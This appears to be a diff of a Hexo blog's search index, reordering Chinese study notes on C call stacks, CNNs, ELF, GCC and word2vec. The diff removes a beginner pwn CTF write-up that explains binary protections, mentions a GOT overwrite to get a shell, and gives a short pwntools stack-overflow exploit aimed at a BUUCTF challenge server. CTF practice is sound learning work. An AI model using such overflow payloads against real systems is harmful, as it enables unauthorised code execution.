@@ -1,114 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>C语言函数调用栈的变化</title>
-    <url>/2021/11/12/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96.html</url>
-    <content><![CDATA[<p>函数调用过程中栈的变化情况，使用OD查看。</p>
-<span id="more"></span>
-<meta name="referrer" content="no-referrer"/>
-<h2 id="写一个简单的c程序">写一个简单的C程序</h2>
-<p><img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928175432813-259024174.png" /></p>
-<h2 id="od调试">OD调试</h2>
-<p>备注OD中显示的字符串顺序和字节顺序相反。<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928175856659-1739815303.png" alt="image-20210928175853974" /></p>
-<p>设置两个断点，上面的是fun函数，下面的是main函数，直接F9执行到printf处。</p>
-<figure>
-<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928175530047-778883573.png" alt="image-20210928175527193" /><figcaption aria-hidden="true">image-20210928175527193</figcaption>
-</figure>
-<p>执行到printf处时，栈的情况。EBP=0x0061FEA8，需要主要栈窗口中会将一个函数对应的栈空间用大括号括起来，上一个函数保存的EBP往往在<strong>大括号外面</strong>的下一个，EBP寄存器也指向那个单元。</p>
-<figure>
-<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928180053498-1839617944.png" alt="image-20210928180050775" /><figcaption aria-hidden="true">image-20210928180050775</figcaption>
-</figure>
-<p>F8继续执行，发现栈顶的hello并没有消失，不知道为啥。难道是因为使用的是move esp hello？</p>
-<p>F7进入fun函数，push了调用fun函数指令的下一条执行。0x401500是fun函数的起始地址，push ebp指令的地址。</p>
-<figure>
-<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928180651374-840441997.png" alt="image-20210928180648633" /><figcaption aria-hidden="true">image-20210928180648633</figcaption>
-</figure>
-<figure>
-<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928180832040-362440497.png" alt="image-20210928180829321" /><figcaption aria-hidden="true">image-20210928180829321</figcaption>
-</figure>
-<p>继续执行push ebp，观察栈的变化。0x0061FEA8是main函数的EBP，此时EBP任然等于0x0061FEA8.</p>
-<p>注意这里大括号的位置，EBP和之后的EIP都存在main的栈里面。</p>
-<figure>
-<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928180931017-719194241.png" alt="image-20210928180928333" /><figcaption aria-hidden="true">image-20210928180928333</figcaption>
-</figure>
-<p>直接执行到leave，栈空间大小位16个单元。局部变量放在EBP上面，还有12个单元是空着的。</p>
-<figure>
-<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928181348437-912568688.png" alt="image-20210928181345703" /><figcaption aria-hidden="true">image-20210928181345703</figcaption>
-</figure>
-<p>执行leave，观察C9 leave的作用.关闭了栈空间，但是原来的数据还是在那。相当于仅仅改变了EBP和ESP到执行fun函数的第一条指令前。</p>
-<figure>
-<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928181655819-1321192269.png" alt="image-20210928181653008" /><figcaption aria-hidden="true">image-20210928181653008</figcaption>
-</figure>
-<p>最后执行retn，EIP=0x40152E</p>
-<figure>
-<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928181911952-576817960.png" alt="image-20210928181908302" /><figcaption aria-hidden="true">image-20210928181908302</figcaption>
-</figure>
-<h2 id="总结">总结</h2>
-<p>函数调用过程中，先入下一条指令地址，再保存EBP，再往上面放局部变量等。</p>
-<p>fun没有包含参数调用，参数应该是最早入栈的.然后才是EIP，最后是EBP。之后就是调用函数的参数</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>reversing</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CNN原理与实践</title>
-    <url>/2021/10/17/CNN%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5.html</url>
-    <content><![CDATA[<h2 id="原理详解">原理详解</h2>
-<h3 id="卷积">卷积</h3>
-<p>通过设置一个<strong>filter或者称为kernel</strong>，对输入的矩阵进行<strong>卷积</strong>，对应位置相乘。<strong>步长为1</strong>，矩阵两个维度均减小<strong>kernel维度-1</strong>.</p>
-<p><strong>可以通过设计特定的filter，让它去跟图片做卷积，就可以识别出图片中的某些特征</strong><span id="more"></span></p>
-<p><strong>CNN（convolutional neural network），主要就是通过一个个的filter，不断地提取特征，从局部的特征到总体的特征，从而进行图像识别等等功能。</strong>学习的目的就是去学习这些filter中的参数。</p>
-<meta name="referrer" content="no-referrer"/>
-<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008193054401-148638570.jpg" /></p>
-<h3 id="padding填白">Padding填白</h3>
-<p>经过卷积后，图像会越来越小，padding分为<strong>same</strong>和<strong>valid</strong>。</p>
-<p>same 就是卷积前后大小不变。<strong>在卷积前</strong>，对图像增加一个padding填白，使大小不变。先要确定卷积核的大小才能确定填充大小。</p>
-<p>valid 就是不经过任何填白。</p>
-<p>但是用什么填充呢，一般采用0填充。零填充：在图片像素的最外层加上若干层0值，若一层，记做p =1。<strong>0在权重乘积和运算中对最终结果不造成影响，也就避免了图片增加了额外的干扰信息。</strong></p>
-<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008193714290-897558988.jpg" /></p>
-<h3 id="步长stride">步长stride</h3>
-<p>就是卷积核的移动长度，每次向右移动一个步长。</p>
-<h3 id="pooling池化">pooling池化</h3>
-<p>有的地方也成为<strong>采样sampling</strong></p>
-<p>池化的目的使提取一定区域的主要特征，<strong>减少参数数量，防止模型过拟合</strong>。</p>
-<p>常见的pooling有<strong>maxpooling</strong>，取一定区域的最大值。取步长为2，取区域最大值。还有averagePooling</p>
-<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008194057122-600716143.jpg" /></p>
-<h3 id="多通道卷积">多通道卷积</h3>
-<p>全面看的都是输入的二维矩阵，现在看多通道，即三维的输入。</p>
-<p>注意到下图要求，卷积核的最后一个3就是<strong>通道channel</strong>数，必须相同。</p>
-<p>每一个kernel进行卷积得到一个二维矩阵，通过激活函数ReLU后放在一起即可。</p>
-<p>这里需要主要一下维度的变化，<strong>kernel的数量==结果的通道数，输入通道数==kernel通道数</strong>。</p>
-<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008194352219-2047578984.jpg" /></p>
-<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008200101676-1316336134.png" /></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new_height = (input_height - filter_height + <span class="number">2</span> * P)/S + <span class="number">1</span></span><br><span class="line">new_width = (input_width - filter_width + <span class="number">2</span> * P)/S + <span class="number">1</span></span><br></pre></td></tr></table></figure>
-<h3 id="cnn网络结构">CNN网络结构</h3>
-<p>X--&gt;CONV(relu)--&gt;MAXPOOL--&gt;CONV(relu)--&gt;FC(relu)--&gt;FC(softmax)--&gt;Y</p>
-<p>扁平化 <strong>(height,width,channel)</strong>的数据压缩成长度为 <strong>height × width × channel</strong> 的一维数组，然后再与 <strong>FC层</strong>连接，<strong>这之后就跟普通的神经网络无异了</strong>。</p>
-<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008194727363-1650633100.jpg" /></p>
-<h3 id="cnn相对传统网络的优势">CNN相对传统网络的优势</h3>
-<ul>
-<li>参数共享机制。网络的参数大大减少，可以使用较少的参数训练出更好的模型。</li>
-<li>连接的稀疏性 输出的图像的任何一个单元仅和图像的一部分有关。</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shape : N*C*H*W  ,  卷积核： H*W*</span><br></pre></td></tr></table></figure>
-<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211010095235308-136260343.png" /></p>
-<h2 id="cnn代码实践">CNN代码实践</h2>
-<h2 id="参考">参考</h2>
-<p><a href="https://zhuanlan.zhihu.com/p/42559190">【DL笔记6】从此明白了卷积神经网络（CNN） - 知乎 (zhihu.com)</a></p>
-<p><a href="https://blog.csdn.net/qq_34714751/article/details/85610966">(14条消息) 使用PyTorch实现CNN_dongyangY的博客-CSDN博客</a></p>
-]]></content>
-      <categories>
-        <category>deep_learning</category>
-      </categories>
-      <tags>
-        <tag>model</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ELF文件解析</title>
     <url>/2021/11/12/ELF%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90.html</url>
     <content><![CDATA[<p>ELF可执行可链接格式，最初由UNIX系统实验室作为应用程序二进制接口的一部分制定，是COFF(common file format)的变种，相关定义在/usr/include/elf.h文件中。</p>
@@ -268,6 +160,60 @@
       </tags>
   </entry>
   <entry>
+    <title>C语言函数调用栈的变化</title>
+    <url>/2021/11/12/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96.html</url>
+    <content><![CDATA[<p>函数调用过程中栈的变化情况，使用OD查看。</p>
+<span id="more"></span>
+<meta name="referrer" content="no-referrer"/>
+<h2 id="写一个简单的c程序">写一个简单的C程序</h2>
+<p><img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928175432813-259024174.png" /></p>
+<h2 id="od调试">OD调试</h2>
+<p>备注OD中显示的字符串顺序和字节顺序相反。<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928175856659-1739815303.png" alt="image-20210928175853974" /></p>
+<p>设置两个断点，上面的是fun函数，下面的是main函数，直接F9执行到printf处。</p>
+<figure>
+<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928175530047-778883573.png" alt="image-20210928175527193" /><figcaption aria-hidden="true">image-20210928175527193</figcaption>
+</figure>
+<p>执行到printf处时，栈的情况。EBP=0x0061FEA8，需要主要栈窗口中会将一个函数对应的栈空间用大括号括起来，上一个函数保存的EBP往往在<strong>大括号外面</strong>的下一个，EBP寄存器也指向那个单元。</p>
+<figure>
+<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928180053498-1839617944.png" alt="image-20210928180050775" /><figcaption aria-hidden="true">image-20210928180050775</figcaption>
+</figure>
+<p>F8继续执行，发现栈顶的hello并没有消失，不知道为啥。难道是因为使用的是move esp hello？</p>
+<p>F7进入fun函数，push了调用fun函数指令的下一条执行。0x401500是fun函数的起始地址，push ebp指令的地址。</p>
+<figure>
+<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928180651374-840441997.png" alt="image-20210928180648633" /><figcaption aria-hidden="true">image-20210928180648633</figcaption>
+</figure>
+<figure>
+<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928180832040-362440497.png" alt="image-20210928180829321" /><figcaption aria-hidden="true">image-20210928180829321</figcaption>
+</figure>
+<p>继续执行push ebp，观察栈的变化。0x0061FEA8是main函数的EBP，此时EBP任然等于0x0061FEA8.</p>
+<p>注意这里大括号的位置，EBP和之后的EIP都存在main的栈里面。</p>
+<figure>
+<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928180931017-719194241.png" alt="image-20210928180928333" /><figcaption aria-hidden="true">image-20210928180928333</figcaption>
+</figure>
+<p>直接执行到leave，栈空间大小位16个单元。局部变量放在EBP上面，还有12个单元是空着的。</p>
+<figure>
+<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928181348437-912568688.png" alt="image-20210928181345703" /><figcaption aria-hidden="true">image-20210928181345703</figcaption>
+</figure>
+<p>执行leave，观察C9 leave的作用.关闭了栈空间，但是原来的数据还是在那。相当于仅仅改变了EBP和ESP到执行fun函数的第一条指令前。</p>
+<figure>
+<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928181655819-1321192269.png" alt="image-20210928181653008" /><figcaption aria-hidden="true">image-20210928181653008</figcaption>
+</figure>
+<p>最后执行retn，EIP=0x40152E</p>
+<figure>
+<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928181911952-576817960.png" alt="image-20210928181908302" /><figcaption aria-hidden="true">image-20210928181908302</figcaption>
+</figure>
+<h2 id="总结">总结</h2>
+<p>函数调用过程中，先入下一条指令地址，再保存EBP，再往上面放局部变量等。</p>
+<p>fun没有包含参数调用，参数应该是最早入栈的.然后才是EIP，最后是EBP。之后就是调用函数的参数</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>reversing</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>GCC编译过程</title>
     <url>/2021/11/12/GCC%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B.html</url>
     <content><![CDATA[<p>GCC（英文全拼：GNU Compiler Collection）是 GNU 工具链的主要组成部分，是一套以 GPL 和 LGPL 许可证发布的程序语言编译器自由软件，由 Richard Stallman 于 1985 年开始开发。</p>
@@ -317,82 +263,57 @@
       </tags>
   </entry>
   <entry>
-    <title>PWN入门</title>
-    <url>/2021/11/12/PWN%E5%85%A5%E9%97%A8.html</url>
-    <content><![CDATA[<p>pwn 入门学习，走一遍流程</p>
-<span id="more"></span>
+    <title>CNN原理与实践</title>
+    <url>/2021/10/17/CNN%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5.html</url>
+    <content><![CDATA[<h2 id="原理详解">原理详解</h2>
+<h3 id="卷积">卷积</h3>
+<p>通过设置一个<strong>filter或者称为kernel</strong>，对输入的矩阵进行<strong>卷积</strong>，对应位置相乘。<strong>步长为1</strong>，矩阵两个维度均减小<strong>kernel维度-1</strong>.</p>
+<p><strong>可以通过设计特定的filter，让它去跟图片做卷积，就可以识别出图片中的某些特征</strong><span id="more"></span></p>
+<p><strong>CNN（convolutional neural network），主要就是通过一个个的filter，不断地提取特征，从局部的特征到总体的特征，从而进行图像识别等等功能。</strong>学习的目的就是去学习这些filter中的参数。</p>
 <meta name="referrer" content="no-referrer"/>
-<p>[TOC]</p>
-<p><a href="https://buuoj.cn/challenges">BUUCTF在线评测 (buuoj.cn)</a> rip</p>
-<h2 id="checksec">checksec</h2>
-<p>使用,查看文件的加固机制</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">checksec filename#老版</span><br><span class="line">checksec --file=filename #新版</span><br></pre></td></tr></table></figure>
-<center>
-<image src="https://upload-images.jianshu.io/upload_images/11071922-51baa910d9fa15dc.png?imageMogr2/auto-orient/strip|imageView2/2/w/626/format/webp"/>
-</center>
-<p><strong>Arch:</strong>程序架构信息</p>
-<p><strong>RELRO</strong>（relocation read-only)：主要针对GOT改写的攻击方式，分为两种，partial relro和full relro</p>
-<p>部分RELRO 易受到攻击，例如攻击者可以<strong>atoi.got为system.plt，进而输入/bin/sh00获得shell</strong> 完全RELRO 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o hello test.c // 默认情况下，是Partial RELRO</span><br><span class="line">gcc -z norelro -o hello test.c // 关闭，即No RELRO</span><br><span class="line">gcc -z lazy -o hello test.c // 部分开启，即Partial RELRO</span><br><span class="line">gcc -z now -o hello test.c // 全部开启，即Full RELRO</span><br></pre></td></tr></table></figure>
-<p><strong>stack-caacry:</strong>栈溢出保护。当启用栈保护后，函数开始执行的时候会先往栈里插入类似cookie的信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。</p>
-<p><strong>NX：</strong>开启会让栈中数据没有执行权限，无法触发shellcode，只会造成程序崩溃，可以利用rop绕过。</p>
-<p><strong>PIE</strong>：位置无关可执行，程序运行时各个段加载的虚拟地址是再装载时确定。</p>
-<h2 id="静态分析代码">静态分析代码</h2>
-<p>看到main函数，gets函数可能存在栈溢出漏洞，接着点击s局部变量进入栈空间。</p>
-<figure>
-<img src="/images/PWN%E5%85%A5%E9%97%A8/2348945-20210924133030041-1533255546.png" alt="image-20210924133025356" /><figcaption aria-hidden="true">image-20210924133025356</figcaption>
-</figure>
-<p>第一次看到略感奇怪怎么两个s，r又是什么。首先明确这是main函数的栈空间，<strong>上面的s是局部变量，下面的s指的是rbp</strong>，64位程序8个字节。r比较特殊，有的地方说是return的东西，但是返回东西一般是通过寄存器eax或rax返回的，有点忘了。<strong>r应该是main函数执行完成后，EIP的值，即main函数结束后要执行的下一条执行。</strong></p>
-<p>栈溢出漏洞请自行补充知识。</p>
-<p><img src="/images/PWN%E5%85%A5%E9%97%A8/2348945-20210924133138596-1167051620.png" /></p>
-<p>找到提权函数，这个还没有搞懂，大概就是让mian函数执行完了，执行fun函数，然后既可以cat flag了。</p>
-<p><img src="/images/PWN%E5%85%A5%E9%97%A8/2348945-20210924133524694-1219666581.png" /></p>
-<h2 id="动态分析">动态分析</h2>
-<p>难度大一些的才需要，使用GDB和peda分析。</p>
-<h2 id="编写exp">编写exp</h2>
-<p>remote和process一个是远程服务器，一个是本地尝试，使用时只用一个。</p>
-<p>本地测试需要赋予可执行的权限，不然总是显示没有权限sudo也不行。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod a+x pwn1</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28082</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./pwn1&#x27;) </span></span><br><span class="line">p1 = <span class="string">&quot;a&quot;</span>*(<span class="number">0xf</span> + <span class="number">0x8</span>) + p64(<span class="number">0x0401185</span>) + p64(<span class="number">0x0401186</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(p1) <span class="comment">#哈啊哈</span></span><br><span class="line"></span><br><span class="line">r.interactive()<span class="comment">#进入交互模式</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008193054401-148638570.jpg" /></p>
+<h3 id="padding填白">Padding填白</h3>
+<p>经过卷积后，图像会越来越小，padding分为<strong>same</strong>和<strong>valid</strong>。</p>
+<p>same 就是卷积前后大小不变。<strong>在卷积前</strong>，对图像增加一个padding填白，使大小不变。先要确定卷积核的大小才能确定填充大小。</p>
+<p>valid 就是不经过任何填白。</p>
+<p>但是用什么填充呢，一般采用0填充。零填充：在图片像素的最外层加上若干层0值，若一层，记做p =1。<strong>0在权重乘积和运算中对最终结果不造成影响，也就避免了图片增加了额外的干扰信息。</strong></p>
+<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008193714290-897558988.jpg" /></p>
+<h3 id="步长stride">步长stride</h3>
+<p>就是卷积核的移动长度，每次向右移动一个步长。</p>
+<h3 id="pooling池化">pooling池化</h3>
+<p>有的地方也成为<strong>采样sampling</strong></p>
+<p>池化的目的使提取一定区域的主要特征，<strong>减少参数数量，防止模型过拟合</strong>。</p>
+<p>常见的pooling有<strong>maxpooling</strong>，取一定区域的最大值。取步长为2，取区域最大值。还有averagePooling</p>
+<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008194057122-600716143.jpg" /></p>
+<h3 id="多通道卷积">多通道卷积</h3>
+<p>全面看的都是输入的二维矩阵，现在看多通道，即三维的输入。</p>
+<p>注意到下图要求，卷积核的最后一个3就是<strong>通道channel</strong>数，必须相同。</p>
+<p>每一个kernel进行卷积得到一个二维矩阵，通过激活函数ReLU后放在一起即可。</p>
+<p>这里需要主要一下维度的变化，<strong>kernel的数量==结果的通道数，输入通道数==kernel通道数</strong>。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008194352219-2047578984.jpg" /></p>
+<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008200101676-1316336134.png" /></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new_height = (input_height - filter_height + <span class="number">2</span> * P)/S + <span class="number">1</span></span><br><span class="line">new_width = (input_width - filter_width + <span class="number">2</span> * P)/S + <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<h3 id="cnn网络结构">CNN网络结构</h3>
+<p>X--&gt;CONV(relu)--&gt;MAXPOOL--&gt;CONV(relu)--&gt;FC(relu)--&gt;FC(softmax)--&gt;Y</p>
+<p>扁平化 <strong>(height,width,channel)</strong>的数据压缩成长度为 <strong>height × width × channel</strong> 的一维数组，然后再与 <strong>FC层</strong>连接，<strong>这之后就跟普通的神经网络无异了</strong>。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008194727363-1650633100.jpg" /></p>
+<h3 id="cnn相对传统网络的优势">CNN相对传统网络的优势</h3>
+<ul>
+<li>参数共享机制。网络的参数大大减少，可以使用较少的参数训练出更好的模型。</li>
+<li>连接的稀疏性 输出的图像的任何一个单元仅和图像的一部分有关。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shape : N*C*H*W  ,  卷积核： H*W*</span><br></pre></td></tr></table></figure>
+<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211010095235308-136260343.png" /></p>
+<h2 id="cnn代码实践">CNN代码实践</h2>
 <h2 id="参考">参考</h2>
-<p><a href="https://www.jianshu.com/p/755e52d48a77">checksec工具使用-pwn - 简书 (jianshu.com)</a></p>
-<p>[(12条消息) <a href="https://blog.csdn.net/weixin_45004513/article/details/117332121">CTF PWN] 从0到0.00001 PWN入门超级详细_Csome-CSDN博客</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/42559190">【DL笔记6】从此明白了卷积神经网络（CNN） - 知乎 (zhihu.com)</a></p>
+<p><a href="https://blog.csdn.net/qq_34714751/article/details/85610966">(14条消息) 使用PyTorch实现CNN_dongyangY的博客-CSDN博客</a></p>
 ]]></content>
       <categories>
-        <category>CTF</category>
+        <category>deep_learning</category>
       </categories>
       <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2021/10/17/hello-world.html</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<span id="more"></span>
-<meta name="referrer" content="no-referrer"/>
-<h2 id="quick-start">Quick Start</h2>
-<p><span class="math display">\[hello sdsd(\frac{a}{b})\]</span></p>
-<p><img src="/images/hello-world/image-20211017201247881.png" /></p>
-<h3 id="create-a-new-post">Create a new post</h3>
-<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211017194040110-1069279989.png" /></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="run-server">Run server</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="generate-static-files">Generate static files</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="deploy-to-remote-sites">Deploy to remote sites</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-      <categories>
-        <category>time</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
+        <tag>model</tag>
       </tags>
   </entry>
   <entry>
@@ -606,50 +527,33 @@ k\left(x_{i}, x_{j}\right)=\exp \left(-\frac{\left\|x_{i}-x_{j}\right\|}{2 \delt
       </tags>
   </entry>
   <entry>
-    <title>Word2vec</title>
-    <url>/2021/10/17/word2vec.html</url>
-    <content><![CDATA[<p>Word2Vec是语言模型中的一种，它是从大量文本预料中以无监督方式学习语义知识的模型，被广泛地应用于自然语言处理中。</p>
-<p>Word2Vec是用来生成词向量的工具，而词向量与语言模型有着密切的关系。</p>
+    <title>Hello World</title>
+    <url>/2021/10/17/hello-world.html</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
 <span id="more"></span>
 <meta name="referrer" content="no-referrer"/>
-<h2 id="基础概念">基础概念</h2>
-<h3 id="语料">语料</h3>
-<p>看word2vec之前可以先看<a href="https://www.cnblogs.com/dddddblog/p/n_gram.html">n-gram模型</a></p>
-<p>word2vec是一个统计语言模型，通过计算条件概率来预测和生成向量。</p>
-<p>n-gram模型在语料库足够大的情况下，不单独统计各个条件概率，而是直接使用这种大概的方式，减少计算</p>
-<p>​ <span class="math display">\[p(w_k|w_{k-n+1},...,w_{k-1}) = \frac{count(w_{k-n},...,w_k)}{count(w_{k-n+1},...w_{k-1})}\]</span></p>
-<p>参数n（word2vec中的窗口大小）确定需要根据模型参数的数量来确定。一般来说越大越好，后面效果增加减少。</p>
-<p>对于统计语言模型而言，利用最大似然，可把目标函数设为：</p>
-<p><img src="https://www.zhihu.com/equation?tex=+%5Cprod_%7Bw+%5Cin+C%7D%5E%7B%7D+p%28w%7CContext%28w%29%29+%5C%5C" alt="[公式]" /> 其中，C表示语料(Corpus)，Context(w)表示词w的上下文，即w周边的词的集合。当Context(w)为空时，就取 <img src="https://www.zhihu.com/equation?tex=p%28w%7CContext%28w%29%29%3D+p%28w%29" alt="[公式]" /> 。特别地，对于前面介绍的n-gram模型，就有 <img src="https://www.zhihu.com/equation?tex=Context%28w_%7Bi%7D+%3D+w_%7Bi-n%2B1%7D%2C...%2Cw_%7Bi-1%7D%29" alt="[公式]" /> 。</p>
-<h3 id="模型基础">模型基础</h3>
-<p>当然，实际应用中常采用最大对数似然，即把目标函数设为</p>
-<p><img src="https://www.zhihu.com/equation?tex=L+%3D+%5Csum_%7Bw+%5Cin+C%7D%5E%7B%7D%7Blog+p%28w%7CContext%28w%29%29%7D++%5Ctag%7B4%7D%5C%5C" alt="[公式]" /> 然后对这个函数进行最大化。</p>
-<p>从公式（4）可见，概率 <img src="https://www.zhihu.com/equation?tex=p%28w%7CContext%28w%29%29" alt="[公式]" /> 已被视为关于w和Context(w)的函数，即：</p>
